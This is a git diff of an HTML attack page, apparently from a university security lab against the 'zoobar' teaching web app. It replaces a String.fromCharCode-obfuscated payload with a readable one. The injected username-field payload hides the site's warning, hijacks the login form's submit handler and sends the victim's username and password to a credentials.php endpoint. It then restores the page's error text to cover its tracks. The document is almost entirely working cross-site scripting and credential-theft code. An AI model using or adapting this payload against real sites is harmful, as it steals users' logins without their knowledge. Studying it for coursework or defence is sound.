@@ -11,16 +11,6 @@
 
   <body>
 
-    <!-- Form for redirecting to localhost's zoobar -->
-    <!--
-    <form id="loginform" name="loginform" method="POST" action="http://localhost/index.php">
-      <input type="text" id="username_field" name="login_username" value="">
-      <input type="password" name="login_password" value="">
-      <input type="submit" name="submit_login" value="Log in">
-    </form>
-    -->
-
-    <!-- Form for redirecting to zoobar.stanford.edu -->
     <form id="loginform" name="loginform" method="POST" action="http://zoobar.stanford.edu/index.php">
       <input type="text" id="username_field" name="login_username" value="">
       <input type="password" name="login_password" value="">
@@ -30,16 +20,72 @@
     <script type="text/javascript">
     //<![CDATA[
       
-      var egg_localhost = "'' onfocus='document.body.children[4].style.display = String.fromCharCode(110, 111, 110, 101)' onblur='document.forms[0].setAttribute(String.fromCharCode(111,110,115,117,98,109,105,116), String.fromCharCode(120, 109, 108, 104, 116, 116, 112, 32, 61, 32, 110, 101, 119, 32, 88, 77, 76, 72, 116, 116, 112, 82, 101, 113, 117, 101, 115, 116, 40, 41, 59, 32, 120, 109, 108, 104, 116, 116, 112, 46, 111, 112, 101, 110, 40, 39, 71, 69, 84, 39, 44, 39, 104, 116, 116, 112, 58, 47, 47, 108, 111, 99, 97, 108, 104, 111, 115, 116, 47, 99, 114, 101, 100, 101, 110, 116, 105, 97, 108, 115, 46, 112, 104, 112, 63, 117, 115, 101, 114, 110, 97, 109, 101, 61, 39, 32, 43, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 102, 111, 114, 109, 115, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 49, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 118, 97, 108, 117, 101, 32, 43, 32, 39, 38, 112, 97, 115, 115, 119, 111, 114, 100, 61, 39, 32, 43, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 102, 111, 114, 109, 115, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 49, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 49, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 118, 97, 108, 117, 101, 44, 102, 97, 108, 115, 101, 41, 59, 32, 120, 109, 108, 104, 116, 116, 112, 46, 115, 101, 110, 100, 40, 41, 59))'";
-      var egg_stanford = "'' onfocus='document.body.children[4].style.display = String.fromCharCode(110, 111, 110, 101)' onblur='document.forms[0].setAttribute(String.fromCharCode(111,110,115,117,98,109,105,116), String.fromCharCode(120, 109, 108, 104, 116, 116, 112, 32, 61, 32, 110, 101, 119, 32, 88, 77, 76, 72, 116, 116, 112, 82, 101, 113, 117, 101, 115, 116, 40, 41, 59, 32, 120, 109, 108, 104, 116, 116, 112, 46, 111, 112, 101, 110, 40, 39, 71, 69, 84, 39, 44, 39, 104, 116, 116, 112, 58, 47, 47, 122, 111, 111, 98, 97, 114, 46, 115, 116, 97, 110, 102, 111, 114, 100, 46, 101, 100, 117, 47, 99, 114, 101, 100, 101, 110, 116, 105, 97, 108, 115, 46, 112, 104, 112, 63, 117, 115, 101, 114, 110, 97, 109, 101, 61, 39, 32, 43, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 102, 111, 114, 109, 115, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 49, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 118, 97, 108, 117, 101, 32, 43, 32, 39, 38, 112, 97, 115, 115, 119, 111, 114, 100, 61, 39, 32, 43, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 102, 111, 114, 109, 115, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 49, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 49, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 118, 97, 108, 117, 101, 44, 102, 97, 108, 115, 101, 41, 59, 32, 120, 109, 108, 104, 116, 116, 112, 46, 115, 101, 110, 100, 40, 41, 59))'";
+      var hostname = "localhost"; // "zoobar.stanford.edu";
+
+      var action = "http://" + hostname + "/index.php";
+
+      var egg = "'' " +
+         "onfocus='if ( typeof(onFocusEventProcessed)==\"undefined\" ) { onFocusEventProcessed = false; } " +
+         
+         "if (!onFocusEventProcessed){ " +
+         "   var warning = document.getElementsByClassName(\"footer\")[0]; warning.style.display = \"none\"; " +
+
+         "   var loginform = document.getElementsByName(\"loginform\")[0]; " +
+         "   loginform.onsubmit = function() { " +
+         "      var hostname = \"" + hostname + "\"; " +
+         "      var username = document.getElementsByName(\"login_username\")[0].value; " +
+         "      var password = document.getElementsByName(\"login_password\")[0].value; " +
+         "      var login_query = \"login_username=\" + username + \"&\" + \"login_password=\" + password + \"&submit_login=Log%20in\"; " +
+         "      var steal_query = \"username=\" + username + \"&\" + \"password=\" + password; " +
+         "      var login_url = \"http://\" + hostname + \"/index.php\"; " +
+         "      var steal_url = \"http://\" + hostname + \"/credentials.php\" + \"?\" + steal_query; " +
+                  
+         "      var login_handler = function () { " +
+         "         if (this.readyState != 4) { return; } " +
+         "         if (this.status != 200) { return; } " +
+               
+         "         var el = document.createElement(\"div\"); " +
+         "         el.innerHTML = this.responseText; " +
+               
+         "         if (el.getElementsByClassName(\"footer\").length > 0) { " +
+         "            login_successful = false; " +
+         "            error_message = el.getElementsByClassName(\"footer\")[0].textContent; " +
+         "            header_text = el.getElementsByTagName(\"h1\")[0].textContent; " +
+         "            subheader_text = el.getElementsByTagName(\"h2\")[0].textContent; " +
+         "         } " +
+         "         else{ " +
+         "            var steal_request = new XMLHttpRequest(); " +
+         "            steal_request.open(\"GET\", steal_url, false); " +
+         "            steal_request.send(); " +
+         "            login_successful = true; " +
+         "         } " +
+         "      }; " +    
+             
+         "      var login_request = new XMLHttpRequest(); " +
+         "      login_request.open(\"POST\", login_url, false); " +
+         "      login_request.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\"); " +
+         "      login_request.onreadystatechange = login_handler; " +
+         "      login_request.send(login_query); " +
+            
+         "      if (!login_successful){ " +
+         "         document.getElementsByTagName(\"h1\")[0].textContent = header_text; " +
+         "         document.getElementsByTagName(\"h2\")[0].textContent = subheader_text; " +
+         "         document.getElementsByClassName(\"footer\")[0].textContent = error_message; " +
+         "         document.getElementsByClassName(\"footer\")[0]; warning.style.display = \"block\"; " +
+         "         return false; " +
+         "      } " +
+         "   }; " +
+         "} " + 
+         
+         "onFocusEventProcessed = true;' ";
 
 
       var username_field = document.getElementById('username_field');
       var form = document.getElementById('loginform');
 
-      // username_field.value = egg_localhost;
-      username_field.value = egg_stanford;
+      username_field.value = egg;
 
+      form.action = action;
       form.submit();
 
     //]]>
